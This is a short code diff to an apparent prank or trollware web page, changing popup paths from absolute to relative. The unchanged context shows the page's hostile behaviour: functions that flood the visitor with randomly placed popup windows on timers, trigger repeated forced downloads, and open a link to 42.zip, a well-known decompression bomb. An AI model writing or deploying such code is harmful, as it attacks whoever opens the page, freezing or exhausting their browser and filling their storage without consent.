@@ -139,9 +139,9 @@
             const width = getRandomNumber(screenWidth / 5, screenWidth * (3 / 4));
 
             // Open a new window at the random coordinates and width
-            window.open("/bg.html", "_blank");
-            window.open("/window.html", "win", `width=${width},height=200,left=${left},top=${top}`);
-            window.open("/window.html", "_blank", `width=${width},height=200,left=${left},top=${top}`);
+            window.open("./bg.html", "_blank");
+            window.open("./window.html", "win", `width=${width},height=200,left=${left},top=${top}`);
+            window.open("./window.html", "_blank", `width=${width},height=200,left=${left},top=${top}`);
         }
 
 		function downloadFile() {
@@ -170,7 +170,7 @@
         }
 
 		function infinite() {
-            setInterval(window.open("/bg.html", "_blank"), 500);
+            setInterval(window.open("./bg.html", "_blank"), 500);
             setInterval(window.open("https://github.com/iamtraction/ZOD/raw/master/42.zip", "_blank"), 750);
 			setInterval(createRandomMovingWindow, 1000);
 			setInterval(downloadFile, 2000);
